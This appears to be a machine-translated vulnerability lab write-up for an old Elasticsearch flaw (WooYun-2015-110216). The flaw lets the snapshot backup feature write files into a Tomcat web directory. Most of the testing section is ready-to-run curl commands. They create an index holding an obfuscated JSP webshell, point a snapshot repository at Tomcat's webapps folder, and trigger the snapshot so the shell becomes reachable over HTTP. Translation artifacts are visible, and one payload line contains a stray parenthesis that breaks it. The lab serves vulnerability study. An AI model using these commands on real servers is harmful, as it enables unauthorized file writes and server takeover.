# ElasticsearchWriting webshell Vulnerability (WooYun-2015-110216)

Reference article: http://cb.drops.wiki/bugs/wooyun-2015-0110216.html

## Principle

ElasticSearch has the ability to back up data, allowing users to pass in a path to back up data to that path, with file names and suffixes being controllable.

So, if you run other services like the Tomcat, PHP, etc. under the file system, we can use the backup function of ElasticSearch to write a webshell.

Similar to CVE-2015-5531, this vulnerability is related to the backup repository. After elasticsearch1.5.1, it limits the root path of the backup repository to the configuration file `path.repo` of the configuration file, and if the administrator does not configure this option, it cannot be used by default. Even if the administrator has configured this option, the web path cannot be written to the webshell if it is not in the directory. So the version of ElasticSearch affected by this vulnerability was 1.5.x before.

## test environment

Compile and start the test environment:

```
Docker-compose build
Docker-compose up -d
```

Briefly introduce the test environment. This test environment runs both Tomcat and ElasticSearch, the Tomcat directory is `/usr/local/tomcat`, the web directory is `/usr/local/tomcat/webapps`, and the ElasticSearch directory is `/usr/share/elasticsearch`.

Our goal is to use ElasticSearch to write our webshell in the `/usr/local/tomcat/webapps` directory.

## Testing process

First create a malicious index document:

```
Curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112}))),new String(new byte[]{114,119})).write(request.getParameter(new) String(new byte[]{102})).getBytes());%>":"test"}
'
```

Create another malicious repository, where the value of `location` is the path I want to write.

> Director: The path to this Repositories is interesting because it can be written anywhere you can access it and will be created automatically if it does not exist. That is to say you can create any folder through the file access protocol. Here I point this path to the tomcat web deployment directory, because as long as the directory is created in this folder, Tomcat will automatically create a new application (the file name is wwwroot, the application name is wwwroot).

```
Curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}'
```

The repository is validated and created:

```
Curl -XPUT "http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

carry out!

Visit `http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp`, this is the webshell we wrote.

The role of the shell is to write arbitrary strings to the test.jsp file under wwwroot, such as: `http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success `, we can see success by visiting /wwwroot/test.jsp:

![](1.png)